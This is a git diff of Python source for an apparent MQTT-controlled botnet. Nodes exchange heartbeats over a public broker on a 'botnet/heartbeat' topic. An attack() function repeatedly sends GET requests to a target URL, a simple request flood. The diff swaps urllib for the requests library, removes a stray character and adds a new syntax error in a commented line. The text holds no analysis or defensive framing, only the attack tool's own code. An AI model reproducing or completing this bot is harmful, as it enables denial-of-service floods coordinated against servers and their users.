@@ -1,6 +1,6 @@
 import paho.mqtt.client as mqtt
 import time
-import urllib.request
+import requests#import urllib.request
 broker = "iot.eclipse.org"
 port = 1883
 global received,nodeId,lastId,target
@@ -69,7 +69,12 @@ def attack():
     while(True):
         ##get
         print("get")
-        contents = urllib.request.urlopen(target).read()
+        r = requests.get(target)
+        #print(r.text)
+        #print(r.headers['content-type'])
+        #print(r.headers)
+        #print(r.status_code)
+        #print(type(r)).
         time.sleep(1)
         if(int((time.time()-startTime)%60)==0):
             client.loop(.1)
@@ -129,7 +134,7 @@ def master():
             time.sleep(.7)
             ret= client.publish("botnet/heartbeat",heartbeat())            
             print("Last id:",lastId)
-            print("Target:",target)S
+            print("Target:",target)
             print(ret)
             
 def common():
